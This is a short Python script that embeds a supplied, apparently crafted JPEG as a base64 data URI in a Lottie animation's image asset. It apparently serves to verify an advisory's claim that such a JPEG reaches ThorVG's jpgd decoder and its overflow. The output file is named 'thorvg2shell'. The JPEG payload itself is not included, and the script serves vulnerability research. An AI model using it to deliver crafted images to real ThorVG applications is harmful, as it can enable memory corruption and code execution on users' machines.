#!/usr/bin/env python3
"""Build a Lottie JSON whose image asset embeds a crafted JPEG as a data URI.

ThorVG's own Lottie loader parses the asset (`parseAssetSource`), b64-decodes
the JPEG into asset.data, and `LottieImage::get()` calls
`picture->load(asset.data, asset.size, asset.mimeType)` -> jpgd. This is the
reachability probe for the advisory's "JPEG inside a Lottie/dotLottie asset"
claim. Pure generator; no external network, no probing.
"""
import base64
import json
import sys


def main() -> int:
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} INPUT.jpg OUTPUT.json", file=sys.stderr)
        return 2
    jpg_path, out_path = sys.argv[1], sys.argv[2]
    with open(jpg_path, "rb") as fh:
        raw = fh.read()
    # Parse JPEG SOF for the real frame dimensions; the overflow needs the
    # crafted large frame, and the asset w/h must be nonzero for the parser to
    # construct a LottieImage at all (tvgLottieParser.cpp:1072).
    w = h = 0
    i = 2
    while i + 9 < len(raw):
        if raw[i] != 0xFF:
            i += 1
            continue
        marker = raw[i + 1]
        if marker in (0xD8, 0xD9) or 0xD0 <= marker <= 0xD7:
            i += 2
            continue
        seglen = int.from_bytes(raw[i + 2:i + 4], "big")
        if marker in (0xC0, 0xC1, 0xC2):
            h = int.from_bytes(raw[i + 5:i + 7], "big")
            w = int.from_bytes(raw[i + 7:i + 9], "big")
            break
        i += 2 + seglen
    if not w or not h:
        print("could not read SOF dimensions", file=sys.stderr)
        return 2
    uri = "data:image/jpeg;base64," + base64.b64encode(raw).decode("ascii")
    doc = {
        "v": "5.9.0", "fr": 30, "ip": 0, "op": 60,
        "w": 64, "h": 64, "nm": "thorvg2shell", "ddd": 0,
        "assets": [{
            "id": "image_0", "w": w, "h": h, "u": "",
            "p": uri, "e": 1,
        }],
        "layers": [{
            "ddd": 0, "ind": 1, "ty": 2, "nm": "img",
            "refId": "image_0", "sr": 1,
            "ks": {
                "o": {"a": 0, "k": 100},
                "r": {"a": 0, "k": 0},
                "p": {"a": 0, "k": [0, 0, 0]},
                "a": {"a": 0, "k": [0, 0, 0]},
                "s": {"a": 0, "k": [100, 100, 100]},
            },
            "ao": 0, "ip": 0, "op": 60, "st": 0, "bm": 0,
        }],
    }
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(doc, fh, separators=(",", ":"))
    print(f"wrote {out_path}: jpeg={len(raw)}B {w}x{h} json={len(json.dumps(doc))}B")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
